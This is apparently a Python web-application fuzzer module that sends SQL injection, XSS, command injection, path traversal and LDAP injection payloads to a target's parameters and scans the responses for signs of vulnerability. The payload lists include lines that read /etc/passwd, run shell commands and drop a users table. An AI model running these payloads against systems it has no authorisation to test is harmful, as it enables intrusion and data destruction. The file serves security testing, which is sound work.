"""
Parameter Fuzzer Module

This module provides parameter fuzzing capabilities for web applications,
testing various input validation and boundary conditions.
"""

import asyncio
import json
import random
import string
from typing import Dict, List, Optional, Any
from pathlib import Path
import requests

from app.logger import logger


class ParameterFuzzer:
    """Parameter fuzzing engine for web applications"""
    
    def __init__(self, target_url: str, output_dir: str = "./results"):
        """
        Initialize parameter fuzzer
        
        Args:
            target_url: Target URL to fuzz
            output_dir: Directory to save results
        """
        self.target_url = target_url
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Fuzzing results
        self.fuzz_results = {
            'parameter_discovery': [],
            'injection_tests': [],
            'boundary_tests': [],
            'encoding_tests': [],
            'vulnerabilities': []
        }
        
        # Fuzzing payloads
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load fuzzing payloads for different attack types"""
        return {
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "1' AND 1=1--",
                "admin'--",
                "' OR 1=1#"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "';alert('XSS');//",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "; ping -c 1 127.0.0.1"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
            ],
            'ldap_injection': [
                "*)(uid=*",
                "*)(|(uid=*))",
                "admin)(&(password=*))",
                "*))%00",
                "*()|%26'"
            ],
            'boundary_values': [
                "",  # Empty string
                " ",  # Space
                "A" * 1000,  # Long string
                "A" * 10000,  # Very long string
                "-1",  # Negative number
                "0",  # Zero
                "999999999999999999999",  # Large number
                "null",  # Null string
                "undefined",  # Undefined
                "\x00",  # Null byte
                "\n\r\t",  # Special characters
            ],
            'encoding_tests': [
                "%00",  # Null byte encoded
                "%0a",  # Newline encoded
                "%22",  # Quote encoded
                "%27",  # Single quote encoded
                "%3c",  # Less than encoded
                "%3e",  # Greater than encoded
                "%2f",  # Forward slash encoded
                "%5c",  # Backslash encoded
            ]
        }
    
    async def fuzz_parameters(self, 
                             parameters: List[str],
                             methods: List[str] = ['GET', 'POST'],
                             deep_fuzz: bool = False) -> Dict:
        """
        Perform parameter fuzzing
        
        Args:
            parameters: List of parameter names to fuzz
            methods: HTTP methods to test
            deep_fuzz: Perform deep fuzzing with more payloads
            
        Returns:
            Dictionary containing fuzzing results
        """
        logger.info(f"Starting parameter fuzzing for {len(parameters)} parameters")
        
        try:
            # Discover additional parameters
            await self._discover_parameters()
            
            # Test each parameter with different payloads
            for param in parameters:
                await self._fuzz_parameter(param, methods, deep_fuzz)
            
            # Test boundary conditions
            await self._test_boundary_conditions(parameters)
            
            # Test encoding variations
            await self._test_encoding_variations(parameters)
            
            # Save results
            await self._save_results()
            
            return self._format_results()
            
        except Exception as e:
            logger.error(f"Parameter fuzzing failed: {e}")
            return {'error': str(e)}
    
    async def _discover_parameters(self):
        """Discover hidden parameters through fuzzing"""
        logger.info("Discovering hidden parameters...")
        
        # Common parameter names to test
        common_params = [
            'id', 'user', 'username', 'password', 'email', 'search', 'q',
            'page', 'limit', 'offset', 'sort', 'order', 'filter', 'category',
            'action', 'cmd', 'command', 'file', 'path', 'url', 'redirect',
            'callback', 'jsonp', 'format', 'type', 'mode', 'debug', 'test'
        ]
        
        discovered_params = []
        
        for param in common_params:
            try:
                # Test parameter with a simple value
                test_url = f"{self.target_url}?{param}=test"
                response = requests.get(test_url, timeout=5)
                
                # Mock parameter discovery logic
                if response.status_code == 200:
                    # Check if parameter affects response
                    if len(response.text) > 0:
                        discovered_params.append({
                            'parameter': param,
                            'method': 'GET',
                            'evidence': 'Parameter affects response',
                            'status_code': response.status_code
                        })
                
            except Exception as e:
                logger.debug(f"Error testing parameter {param}: {e}")
                continue
        
        self.fuzz_results['parameter_discovery'] = discovered_params
        logger.info(f"Discovered {len(discovered_params)} potential parameters")
    
    async def _fuzz_parameter(self, param: str, methods: List[str], deep_fuzz: bool):
        """Fuzz a specific parameter with various payloads"""
        logger.debug(f"Fuzzing parameter: {param}")
        
        for method in methods:
            for payload_type, payloads in self.payloads.items():
                if payload_type == 'boundary_values' and not deep_fuzz:
                    continue  # Skip boundary tests in normal mode
                
                for payload in payloads:
                    try:
                        result = await self._test_payload(param, payload, method, payload_type)
                        if result:
                            self.fuzz_results['injection_tests'].append(result)
                    
                    except Exception as e:
                        logger.debug(f"Error testing payload {payload}: {e}")
                        continue
    
    async def _test_payload(self, param: str, payload: str, method: str, payload_type: str) -> Optional[Dict]:
        """Test a specific payload against a parameter"""
        try:
            if method == 'GET':
                test_url = f"{self.target_url}?{param}={payload}"
                response = requests.get(test_url, timeout=5)
            else:
                data = {param: payload}
                response = requests.post(self.target_url, data=data, timeout=5)
            
            # Analyze response for potential vulnerabilities
            vulnerability = self._analyze_response(response, param, payload, payload_type)
            
            return {
                'parameter': param,
                'payload': payload,
                'payload_type': payload_type,
                'method': method,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'vulnerability': vulnerability,
                'timestamp': asyncio.get_event_loop().time()
            }
            
        except Exception as e:
            logger.debug(f"Error testing payload: {e}")
            return None
    
    def _analyze_response(self, response, param: str, payload: str, payload_type: str) -> Optional[Dict]:
        """Analyze response for potential vulnerabilities"""
        vulnerability = None
        
        # Check for SQL injection indicators
        if payload_type == 'sql_injection':
            sql_errors = [
                'mysql_fetch_array',
                'ORA-01756',
                'Microsoft OLE DB Provider',
                'SQLServer JDBC Driver',
                'PostgreSQL query failed',
                'Warning: mysql_'
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    vulnerability = {
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'evidence': f'SQL error detected: {error}',
                        'parameter': param,
                        'payload': payload
                    }
                    break
        
        # Check for XSS indicators
        elif payload_type == 'xss':
            if payload in response.text:
                vulnerability = {
                    'type': 'Cross-Site Scripting (XSS)',
                    'severity': 'Medium',
                    'evidence': 'Payload reflected in response',
                    'parameter': param,
                    'payload': payload
                }
        
        # Check for command injection indicators
        elif payload_type == 'command_injection':
            command_indicators = ['uid=', 'gid=', 'root:', 'bin/bash', 'cmd.exe']
            
            for indicator in command_indicators:
                if indicator in response.text:
                    vulnerability = {
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'evidence': f'Command output detected: {indicator}',
                        'parameter': param,
                        'payload': payload
                    }
                    break
        
        # Check for path traversal indicators
        elif payload_type == 'path_traversal':
            path_indicators = ['root:x:', '[boot loader]', 'etc/passwd']
            
            for indicator in path_indicators:
                if indicator in response.text:
                    vulnerability = {
                        'type': 'Path Traversal',
                        'severity': 'High',
                        'evidence': f'File content detected: {indicator}',
                        'parameter': param,
                        'payload': payload
                    }
                    break
        
        if vulnerability:
            self.fuzz_results['vulnerabilities'].append(vulnerability)
        
        return vulnerability
    
    async def _test_boundary_conditions(self, parameters: List[str]):
        """Test boundary conditions for parameters"""
        logger.info("Testing boundary conditions...")
        
        boundary_tests = []
        
        for param in parameters:
            for boundary_value in self.payloads['boundary_values']:
                try:
                    test_url = f"{self.target_url}?{param}={boundary_value}"
                    response = requests.get(test_url, timeout=5)
                    
                    boundary_tests.append({
                        'parameter': param,
                        'boundary_value': boundary_value,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'error_detected': response.status_code >= 500
                    })
                    
                except Exception as e:
                    boundary_tests.append({
                        'parameter': param,
                        'boundary_value': boundary_value,
                        'error': str(e),
                        'connection_failed': True
                    })
        
        self.fuzz_results['boundary_tests'] = boundary_tests
        logger.info(f"Completed {len(boundary_tests)} boundary tests")
    
    async def _test_encoding_variations(self, parameters: List[str]):
        """Test different encoding variations"""
        logger.info("Testing encoding variations...")
        
        encoding_tests = []
        
        for param in parameters:
            for encoded_value in self.payloads['encoding_tests']:
                try:
                    test_url = f"{self.target_url}?{param}={encoded_value}"
                    response = requests.get(test_url, timeout=5)
                    
                    encoding_tests.append({
                        'parameter': param,
                        'encoded_value': encoded_value,
                        'status_code': response.status_code,
                        'response_length': len(response.text)
                    })
                    
                except Exception as e:
                    logger.debug(f"Error testing encoding {encoded_value}: {e}")
                    continue
        
        self.fuzz_results['encoding_tests'] = encoding_tests
        logger.info(f"Completed {len(encoding_tests)} encoding tests")
    
    async def _save_results(self):
        """Save fuzzing results to file"""
        target_name = self.target_url.replace('https://', '').replace('http://', '').replace('/', '_')
        results_file = self.output_dir / f"parameter_fuzz_{target_name}.json"
        
        with open(results_file, 'w') as f:
            json.dump(self.fuzz_results, f, indent=2)
        
        logger.info(f"Parameter fuzzing results saved to: {results_file}")
    
    def _format_results(self) -> Dict:
        """Format results for return"""
        total_tests = (
            len(self.fuzz_results['parameter_discovery']) +
            len(self.fuzz_results['injection_tests']) +
            len(self.fuzz_results['boundary_tests']) +
            len(self.fuzz_results['encoding_tests'])
        )
        
        return {
            'target': self.target_url,
            'fuzzing_summary': {
                'total_tests': total_tests,
                'parameters_discovered': len(self.fuzz_results['parameter_discovery']),
                'injection_tests': len(self.fuzz_results['injection_tests']),
                'boundary_tests': len(self.fuzz_results['boundary_tests']),
                'encoding_tests': len(self.fuzz_results['encoding_tests']),
                'vulnerabilities_found': len(self.fuzz_results['vulnerabilities'])
            },
            'vulnerabilities': self.fuzz_results['vulnerabilities'],
            'detailed_results': self.fuzz_results,
            'status': 'completed'
        }
    
    def get_vulnerabilities(self) -> List[Dict]:
        """Get discovered vulnerabilities"""
        return self.fuzz_results['vulnerabilities']
    
    def get_discovered_parameters(self) -> List[Dict]:
        """Get discovered parameters"""
        return self.fuzz_results['parameter_discovery']


# Example usage
async def main():
    """Example usage of ParameterFuzzer"""
    fuzzer = ParameterFuzzer("https://httpbin.org/get", "./test_results")
    results = await fuzzer.fuzz_parameters(
        parameters=['q', 'search', 'id'],
        methods=['GET'],
        deep_fuzz=True
    )
    
    print("Parameter Fuzzing Results:")
    print(f"Total tests: {results['fuzzing_summary']['total_tests']}")
    print(f"Vulnerabilities found: {results['fuzzing_summary']['vulnerabilities_found']}")
    
    if results['vulnerabilities']:
        print("\nVulnerabilities:")
        for vuln in results['vulnerabilities']:
            print(f"  - {vuln['type']}: {vuln['parameter']} ({vuln['severity']})")


if __name__ == "__main__":
    asyncio.run(main())